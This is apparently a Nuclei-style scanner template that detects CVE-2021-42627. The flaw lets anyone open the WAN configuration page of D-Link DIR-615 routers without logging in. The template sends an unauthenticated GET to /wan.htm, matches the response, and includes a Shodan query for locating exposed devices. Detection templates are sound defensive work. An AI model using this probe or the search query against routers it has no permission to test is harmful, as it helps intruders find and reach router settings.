id: CVE-2021-42627

info:
  name: D-Link DIR-615 - Information Disclosure
  author: For3stCo1d
  severity: medium
  description: |
    The WAN configuration page "wan.htm" on D-Link DIR-615 devices with firmware 20.06 can be accessed directly without authentication which can lead to disclose the information about WAN settings and also leverage attacker to modify the data fields of page.
  reference:
    - https://github.com/sanjokkarki/D-Link-DIR-615/blob/main/CVE-2021-42627
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42627
    - https://nvd.nist.gov/vuln/detail/CVE-2021-42627
  metadata:
    shodan-query: http.title:"Roteador Wireless"
    verified: "true"
  tags: cve,cve2022,d-link,router,exposure

requests:
  - raw:
      - |
        GET /wan.htm HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "document.write(\"<s\"+\"cript type='text/javascript' src='menu.js?v=\"+Math.random()+\"'></scr\"+\"ipt>\");"
    
      - type: word
        part: header
        words:
          - Virtual Web

      - type: status
        status:
          - 200
